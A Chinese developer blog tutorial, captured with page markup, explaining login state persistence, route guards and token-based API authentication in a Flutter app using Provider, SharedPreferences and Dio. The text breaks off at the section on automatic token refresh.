content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            flutter如何实现有登陆权限管理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3685218707586839/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    linhuai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T04:51:21.000Z" title="Fri Dec 05 2025 04:51:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Flutter 中实现<strong>登录权限管理</strong>，核心是解决「登录状态持久化」「路由权限拦截」「接口鉴权」三大核心问题。以下是一套完整、可落地的实现方案，包含状态管理、路由拦截、持久化、接口鉴权等关键环节：</p>
<p>git: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwinfrise%2Fflutter_login_auth_app" target="_blank" title="https://github.com/winfrise/flutter_login_auth_app" ref="nofollow noopener noreferrer">github.com/winfrise/fl…</a></p>
<p>项目目录：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">lib/
├── main.dart                 # 项目入口
├── pages/                    # 页面（登录页、首页、个人中心等）
│   ├── login/
│   ├── home/
│   └── profile/
├── providers/                # 状态管理（Provider/ChangeNotifier 类）
│   ├── auth_provider.dart    # 登录状态管理（核心文件）
│   └── other_provider.dart   # 其他全局状态（如主题、设置）
├── routes/                   # 路由相关（路由常量、路由拦截）
│   ├── app_routes.dart
│   └── app_router.dart
├── utils/                    # 工具类（网络请求、本地存储、通用方法）
│   ├── http_util.dart
│   └── storage_util.dart
└── models/                   # 数据模型（用户信息、接口返回模型）
    └── user_model.dart
</code></pre>
<h3 data-id="heading-0">一、核心思路梳理</h3>
<ol>
<li><strong>登录状态存储</strong>：用本地持久化（如 <code>SharedPreferences</code>）保存登录凭证（token / 用户信息），APP 启动时读取并初始化状态；</li>
<li><strong>全局状态管理</strong>：用 <code>Provider</code>/<code>GetX</code>/<code>Bloc</code> 管理登录状态，让所有页面能实时感知登录状态变化；</li>
<li><strong>路由权限拦截</strong>：自定义路由守卫，跳转需要登录的页面时，检查登录状态，未登录则跳转到登录页；</li>
<li><strong>接口鉴权</strong>：统一封装网络请求，请求头自动携带 token，token 失效时（401 错误）触发登出逻辑；</li>
<li><strong>登出逻辑</strong>：清除本地凭证 + 重置全局状态 + 跳转登录页。</li>
</ol>
<h3 data-id="heading-1">二、分步实现（以 Provider + SharedPreferences 为例）</h3>
<h4 data-id="heading-2">步骤 1：依赖准备</h4>
<p>添加核心依赖（持久化 + 状态管理）：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">flutter:</span>
    <span class="hljs-attr">sdk:</span> <span class="hljs-string">flutter</span>
  <span class="hljs-attr">shared_preferences:</span> <span class="hljs-string">^2.2.2</span>  <span class="hljs-comment"># 本地持久化</span>
  <span class="hljs-attr">provider:</span> <span class="hljs-string">^6.1.1</span>            <span class="hljs-comment"># 状态管理</span>
  <span class="hljs-attr">dio:</span> <span class="hljs-string">^5.4.0</span>                  <span class="hljs-comment"># 网络请求（接口鉴权）</span>
  <span class="hljs-attr">flutter_secure_storage:</span> <span class="hljs-string">^8.0.0</span> <span class="hljs-comment"># 敏感信息加密存储（可选，替代 SharedPreferences 存 token）</span>
</code></pre>
<h4 data-id="heading-3">步骤 2：封装登录状态管理（全局状态）</h4>
<p>创建 <code>AuthProvider</code> 管理登录状态，包含「登录 / 登出 / 状态检查」核心方法：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:shared_preferences/shared_preferences.dart'</span>;

<span class="hljs-comment">// 登录状态模型（可扩展用户信息）</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserModel</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> token;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> username;

  UserModel({<span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.token, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.username});
}

<span class="hljs-comment">// 全局登录状态管理</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AuthProvider</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ChangeNotifier</span> </span>{
  UserModel? _user; <span class="hljs-comment">// 当前登录用户（null 表示未登录）</span>
  <span class="hljs-built_in">bool</span> _isLoading = <span class="hljs-keyword">false</span>; <span class="hljs-comment">// 登录/登出加载状态</span>

  UserModel? <span class="hljs-keyword">get</span> user =&gt; _user;
  <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isLogin =&gt; _user != <span class="hljs-keyword">null</span>;
  <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isLoading =&gt; _isLoading;

  <span class="hljs-comment">// APP 启动时初始化登录状态（读取本地存储）</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; initAuth() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> sp = <span class="hljs-keyword">await</span> SharedPreferences.getInstance();
    <span class="hljs-keyword">final</span> token = sp.getString(<span class="hljs-string">'token'</span>);
    <span class="hljs-keyword">final</span> username = sp.getString(<span class="hljs-string">'username'</span>);
    <span class="hljs-keyword">if</span> (token != <span class="hljs-keyword">null</span> &amp;&amp; username != <span class="hljs-keyword">null</span>) {
      _user = UserModel(token: token, username: username);
    }
    notifyListeners();
  }

  <span class="hljs-comment">// 登录方法（存储凭证到本地 + 更新状态）</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; login({<span class="hljs-keyword">required</span> <span class="hljs-built_in">String</span> username, <span class="hljs-keyword">required</span> <span class="hljs-built_in">String</span> password}) <span class="hljs-keyword">async</span> {
    _isLoading = <span class="hljs-keyword">true</span>;
    notifyListeners();

    <span class="hljs-comment">// 模拟接口请求（替换为真实登录接口）</span>
    <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>));
    <span class="hljs-keyword">final</span> token = <span class="hljs-string">'mock_token_<span class="hljs-subst">${DateTime.now().millisecondsSinceEpoch}</span>'</span>;

    <span class="hljs-comment">// 存储到本地</span>
    <span class="hljs-keyword">final</span> sp = <span class="hljs-keyword">await</span> SharedPreferences.getInstance();
    <span class="hljs-keyword">await</span> sp.setString(<span class="hljs-string">'token'</span>, token);
    <span class="hljs-keyword">await</span> sp.setString(<span class="hljs-string">'username'</span>, username);

    <span class="hljs-comment">// 更新全局状态</span>
    _user = UserModel(token: token, username: username);
    _isLoading = <span class="hljs-keyword">false</span>;
    notifyListeners();
  }

  <span class="hljs-comment">// 登出方法（清除本地凭证 + 重置状态）</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; logout() <span class="hljs-keyword">async</span> {
    _isLoading = <span class="hljs-keyword">true</span>;
    notifyListeners();

    <span class="hljs-comment">// 清除本地存储</span>
    <span class="hljs-keyword">final</span> sp = <span class="hljs-keyword">await</span> SharedPreferences.getInstance();
    <span class="hljs-keyword">await</span> sp.remove(<span class="hljs-string">'token'</span>);
    <span class="hljs-keyword">await</span> sp.remove(<span class="hljs-string">'username'</span>);

    <span class="hljs-comment">// 重置状态</span>
    _user = <span class="hljs-keyword">null</span>;
    _isLoading = <span class="hljs-keyword">false</span>;
    notifyListeners();
  }
}
</code></pre>
<h4 data-id="heading-4">步骤 3：路由权限拦截（自定义路由守卫）</h4>
<p>自定义 <code>MaterialApp</code> 的 <code>onGenerateRoute</code>，实现「需要登录的页面拦截」：</p>
<h5 data-id="heading-5">3.1 定义路由常量（区分需要登录的页面）</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 路由常量</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppRoutes</span> </span>{
  <span class="hljs-comment">// 公开页面（无需登录）</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> login = <span class="hljs-string">'/login'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> splash = <span class="hljs-string">'/splash'</span>;

  <span class="hljs-comment">// 需登录页面</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> home = <span class="hljs-string">'/home'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> profile = <span class="hljs-string">'/profile'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> settings = <span class="hljs-string">'/settings'</span>;

  <span class="hljs-comment">// 判断页面是否需要登录</span>
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> needAuth(<span class="hljs-built_in">String</span> routeName) {
    <span class="hljs-keyword">return</span> [home, profile, settings].contains(routeName);
  }
}
</code></pre>
<h5 data-id="heading-6">3.2 自定义路由生成器（拦截逻辑）</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;

<span class="hljs-comment">// 页面导入（示例）</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'pages/splash_page.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'pages/login_page.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'pages/home_page.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'pages/profile_page.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppRouter</span> </span>{
  <span class="hljs-keyword">static</span> Route&lt;<span class="hljs-built_in">dynamic</span>&gt; generateRoute(RouteSettings settings) {
    <span class="hljs-keyword">final</span> routeName = settings.name ?? AppRoutes.splash;

    <span class="hljs-keyword">return</span> MaterialPageRoute(
      builder: (context) {
        <span class="hljs-comment">// 1. 检查页面是否需要登录</span>
        <span class="hljs-keyword">final</span> needAuth = AppRoutes.needAuth(routeName);
        <span class="hljs-keyword">final</span> authProvider = Provider.of&lt;AuthProvider&gt;(context, listen: <span class="hljs-keyword">false</span>);

        <span class="hljs-comment">// 2. 未登录且页面需要登录 → 跳转到登录页（携带原路由，登录后返回）</span>
        <span class="hljs-keyword">if</span> (needAuth &amp;&amp; !authProvider.isLogin) {
          <span class="hljs-keyword">return</span> LoginPage(
            redirectRoute: routeName, <span class="hljs-comment">// 登录成功后跳转的目标路由</span>
          );
        }

        <span class="hljs-comment">// 3. 路由分发</span>
        <span class="hljs-keyword">switch</span> (routeName) {
          <span class="hljs-keyword">case</span> AppRoutes.splash:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> SplashPage();
          <span class="hljs-keyword">case</span> AppRoutes.login:
            <span class="hljs-keyword">return</span> LoginPage(redirectRoute: settings.arguments <span class="hljs-keyword">as</span> <span class="hljs-built_in">String?</span>);
          <span class="hljs-keyword">case</span> AppRoutes.home:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> HomePage();
          <span class="hljs-keyword">case</span> AppRoutes.profile:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> ProfilePage();
          <span class="hljs-keyword">default</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> Scaffold(body: Center(child: Text(<span class="hljs-string">'404 Page'</span>)));
        }
      },
      settings: settings,
    );
  }
}
</code></pre>
<h4 data-id="heading-7">步骤 4：封装网络请求（接口鉴权）</h4>
<p>统一处理 token 携带、401 失效拦截：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:dio/dio.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:shared_preferences/shared_preferences.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'auth_provider.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HttpUtil</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">late</span> Dio _dio;

  <span class="hljs-comment">// 初始化 Dio</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> init() {
    _dio = Dio(BaseOptions(
      baseUrl: <span class="hljs-string">'https://your-api-domain.com'</span>,
      connectTimeout: <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">10</span>),
      receiveTimeout: <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">10</span>),
    ));

    <span class="hljs-comment">// 添加请求拦截器：自动携带 token</span>
    _dio.interceptors.add(InterceptorsWrapper(
      onRequest: (options, handler) <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">final</span> sp = <span class="hljs-keyword">await</span> SharedPreferences.getInstance();
        <span class="hljs-keyword">final</span> token = sp.getString(<span class="hljs-string">'token'</span>);
        <span class="hljs-keyword">if</span> (token != <span class="hljs-keyword">null</span>) {
          options.headers[<span class="hljs-string">'Authorization'</span>] = <span class="hljs-string">'Bearer <span class="hljs-subst">$token</span>'</span>;
        }
        <span class="hljs-keyword">return</span> handler.next(options);
      },
      onError: (error, handler) <span class="hljs-keyword">async</span> {
        <span class="hljs-comment">// 401 错误：token 失效 → 触发登出</span>
        <span class="hljs-keyword">if</span> (error.response?.statusCode == <span class="hljs-number">401</span>) {
          <span class="hljs-comment">// 获取全局 AuthProvider</span>
          <span class="hljs-keyword">final</span> context = navigatorKey.currentContext!;
          <span class="hljs-keyword">final</span> authProvider = Provider.of&lt;AuthProvider&gt;(context, listen: <span class="hljs-keyword">false</span>);
          <span class="hljs-keyword">await</span> authProvider.logout();
          <span class="hljs-comment">// 跳转到登录页</span>
          Navigator.pushNamedAndRemoveUntil(
            context,
            AppRoutes.login,
            (route) =&gt; <span class="hljs-keyword">false</span>,
          );
        }
        <span class="hljs-keyword">return</span> handler.next(error);
      },
    ));
  }

  <span class="hljs-comment">// 封装 GET 请求</span>
  <span class="hljs-keyword">static</span> Future&lt;Response&gt; <span class="hljs-keyword">get</span>(<span class="hljs-built_in">String</span> path, {<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;? params}) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> _dio.<span class="hljs-keyword">get</span>(path, queryParameters: params);
  }

  <span class="hljs-comment">// 封装 POST 请求</span>
  <span class="hljs-keyword">static</span> Future&lt;Response&gt; post(<span class="hljs-built_in">String</span> path, {<span class="hljs-built_in">dynamic</span> data}) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> _dio.post(path, data: data);
  }
}

<span class="hljs-comment">// 全局导航 key（用于无上下文时跳转）</span>
<span class="hljs-keyword">final</span> GlobalKey&lt;NavigatorState&gt; navigatorKey = GlobalKey&lt;NavigatorState&gt;();
</code></pre>
<h4 data-id="heading-8">步骤 5：初始化全局状态 &amp; 路由</h4>
<p>在 <code>main.dart</code> 中初始化状态管理、路由、网络请求：</p>
<p>dart</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'auth_provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'app_router.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'http_util.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'app_routes.dart'</span>;

<span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>() <span class="hljs-keyword">async</span> {
  <span class="hljs-title class_">WidgetsFlutterBinding</span>.<span class="hljs-title function_">ensureInitialized</span>();
  <span class="hljs-comment">// 初始化网络请求</span>
  <span class="hljs-title class_">HttpUtil</span>.<span class="hljs-title function_">init</span>();

  <span class="hljs-title function_">runApp</span>(
    <span class="hljs-title class_">ChangeNotifierProvider</span>(
      <span class="hljs-attr">create</span>: <span class="hljs-function">(<span class="hljs-params">context</span>) =&gt;</span> <span class="hljs-title class_">AuthProvider</span>()..<span class="hljs-title function_">initAuth</span>(), <span class="hljs-comment">// 启动时初始化登录状态</span>
      <span class="hljs-attr">child</span>: <span class="hljs-keyword">const</span> <span class="hljs-title class_">MyApp</span>(),
    ),
  );
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">StatelessWidget</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">MyApp</span>({<span class="hljs-variable language_">super</span>.<span class="hljs-property">key</span>});

  <span class="hljs-meta">@override</span>
  <span class="hljs-title class_">Widget</span> <span class="hljs-title function_">build</span>(<span class="hljs-params">BuildContext context</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">MaterialApp</span>(
      <span class="hljs-attr">title</span>: <span class="hljs-string">'权限管理示例'</span>,
      <span class="hljs-attr">navigatorKey</span>: navigatorKey, <span class="hljs-comment">// 全局导航 key</span>
      <span class="hljs-attr">initialRoute</span>: <span class="hljs-title class_">AppRoutes</span>.<span class="hljs-property">splash</span>, <span class="hljs-comment">// 启动页</span>
      <span class="hljs-attr">onGenerateRoute</span>: <span class="hljs-title class_">AppRouter</span>.<span class="hljs-property">generateRoute</span>, <span class="hljs-comment">// 自定义路由生成器</span>
      <span class="hljs-attr">debugShowCheckedModeBanner</span>: <span class="hljs-literal">false</span>,
    );
  }
}
</code></pre>
<h4 data-id="heading-9">步骤 6：实现登录 / 登出页面示例</h4>
<h5 data-id="heading-10">6.1 登录页（LoginPage）</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'auth_provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'app_routes.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> redirectRoute; <span class="hljs-comment">// 登录成功后跳转的路由</span>

  <span class="hljs-keyword">const</span> LoginPage({<span class="hljs-keyword">super</span>.key, <span class="hljs-keyword">this</span>.redirectRoute});

  <span class="hljs-meta">@override</span>
  State&lt;LoginPage&gt; createState() =&gt; _LoginPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LoginPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">LoginPage</span>&gt; </span>{
  <span class="hljs-keyword">final</span> _usernameCtrl = TextEditingController();
  <span class="hljs-keyword">final</span> _passwordCtrl = TextEditingController();

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">final</span> authProvider = Provider.of&lt;AuthProvider&gt;(context);

    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(title: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'登录'</span>)),
      body: Padding(
        padding: <span class="hljs-keyword">const</span> EdgeInsets.all(<span class="hljs-number">16</span>),
        child: Column(
          children: [
            TextField(
              controller: _usernameCtrl,
              decoration: <span class="hljs-keyword">const</span> InputDecoration(hintText: <span class="hljs-string">'用户名'</span>),
            ),
            TextField(
              controller: _passwordCtrl,
              obscureText: <span class="hljs-keyword">true</span>,
              decoration: <span class="hljs-keyword">const</span> InputDecoration(hintText: <span class="hljs-string">'密码'</span>),
            ),
            <span class="hljs-keyword">const</span> SizedBox(height: <span class="hljs-number">20</span>),
            ElevatedButton(
              onPressed: authProvider.isLoading
                  ? <span class="hljs-keyword">null</span>
                  : () <span class="hljs-keyword">async</span> {
                      <span class="hljs-comment">// 调用登录方法</span>
                      <span class="hljs-keyword">await</span> authProvider.login(
                        username: _usernameCtrl.text,
                        password: _passwordCtrl.text,
                      );
                      <span class="hljs-comment">// 登录成功 → 跳转到目标路由（默认首页）</span>
                      <span class="hljs-keyword">if</span> (authProvider.isLogin) {
                        Navigator.pushReplacementNamed(
                          context,
                          widget.redirectRoute ?? AppRoutes.home,
                        );
                      }
                    },
              child: authProvider.isLoading
                  ? <span class="hljs-keyword">const</span> CircularProgressIndicator(size: <span class="hljs-number">20</span>)
                  : <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'登录'</span>),
            ),
          ],
        ),
      ),
    );
  }
}
</code></pre>
<h5 data-id="heading-11">6.2 个人中心（需登录，示例）</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:provider/provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'auth_provider.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'app_routes.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProfilePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> ProfilePage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">final</span> authProvider = Provider.of&lt;AuthProvider&gt;(context);
    <span class="hljs-keyword">final</span> user = authProvider.user!;

    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(title: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'个人中心'</span>)),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Text(<span class="hljs-string">'用户名：<span class="hljs-subst">${user.username}</span>'</span>),
            Text(<span class="hljs-string">'Token：<span class="hljs-subst">${user.token}</span>'</span>),
            <span class="hljs-keyword">const</span> SizedBox(height: <span class="hljs-number">20</span>),
            ElevatedButton(
              onPressed: () <span class="hljs-keyword">async</span> {
                <span class="hljs-keyword">await</span> authProvider.logout();
                <span class="hljs-comment">// 登出后跳转到登录页</span>
                Navigator.pushNamedAndRemoveUntil(
                  context,
                  AppRoutes.login,
                  (route) =&gt; <span class="hljs-keyword">false</span>,
                );
              },
              child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'退出登录'</span>),
            ),
          ],
        ),
      ),
    );
  }
}
</code></pre>
<h3 data-id="heading-12">三、进阶优化点</h3>
<h4 data-id="heading-13">1. 敏感信息加密存储</h4>
<p><code>SharedPreferences</code> 是明文存储，token 等敏感信息建议用 <code>flutter_secure_storage</code>（基于 Keychain/iOS、Keystore/Android 加密）：</p>
<p>dart</p>
<pre><code class="hljs language-php" lang="php">import <span class="hljs-string">'package:flutter_secure_storage/flutter_secure_storage.dart'</span>;

<span class="hljs-keyword">final</span> storage = <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FlutterSecureStorage</span>();

<span class="hljs-comment">// 存储 token</span>
await storage.<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-attr">key</span>: <span class="hljs-string">'token'</span>, <span class="hljs-attr">value</span>: token);
<span class="hljs-comment">// 读取 token</span>
<span class="hljs-keyword">final</span> token = await storage.<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-attr">key</span>: <span class="hljs-string">'token'</span>);
<span class="hljs-comment">// 清除 token</span>
await storage.<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-attr">key</span>: <span class="hljs-string">'token'</span>);
</code></pre>
<h4 data-id="heading-14">2. 多状态管理方案（替代 Provider）</h4>
<ul>
<li><strong>GetX</strong>：更轻量，无需上下文，直接通过 <code>Get.put(AuthController())</code> 管理状态，路由拦截用 <code>GetMiddleware</code>；</li>
<li><strong>Bloc/Cubit</strong>：适合复杂状态逻辑，通过 <code>BlocBuilder</code> 响应状态变化，路由拦截结合 <code>BlocListener</code>；</li>
<li><strong>Riverpod</strong>：Provider 的升级版，更灵活的依赖注入，无上下文访问状态。</li>
</ul>
<h4 data-id="heading-15">3. 自动刷新 Token</h4>
